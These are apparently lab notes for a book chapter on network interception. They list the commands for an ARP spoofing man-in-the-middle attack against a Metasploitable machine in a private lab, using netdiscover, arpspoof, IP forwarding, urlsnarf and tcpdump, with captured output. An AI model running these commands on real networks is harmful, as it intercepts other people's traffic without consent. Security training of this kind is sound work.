# Commands Used – Chapter 2

## 1. Identify Hosts

From Kali:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

Observed:

```text
192.168.1.1      OPNsense gateway
192.168.1.121    Metasploitable victim
```

## 2. Enable IP Forwarding on Kali

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```

Expected result:

```text
1
```

## 3. Start ARP Spoofing

From Kali terminal 1:

```bash
sudo arpspoof -i eth0 -t 192.168.1.121 192.168.1.1
```

From Kali terminal 2:

```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.121
```

## 4. Start urlsnarf

From Kali terminal 3:

```bash
sudo urlsnarf -i eth0
```

Observed:

```text
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
```

## 5. Generate HTTP Traffic from Metasploitable

```bash
wget http://192.168.1.1
```

Result:

```text
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://192.168.1.1/
```

The HTTPS follow-up failed because Metasploitable is old and does not support the gateway's modern TLS configuration. The important part for this lab was the initial HTTP request to port 80.

## 6. Validate with tcpdump

Because `urlsnarf` did not display the expected book output, `tcpdump` was used for validation:

```bash
sudo tcpdump -i eth0 host 192.168.1.121 and port 80
```

Captured proof:

```text
192.168.1.121 > OPNsense.internal.http
HTTP: GET / HTTP/1.0
```
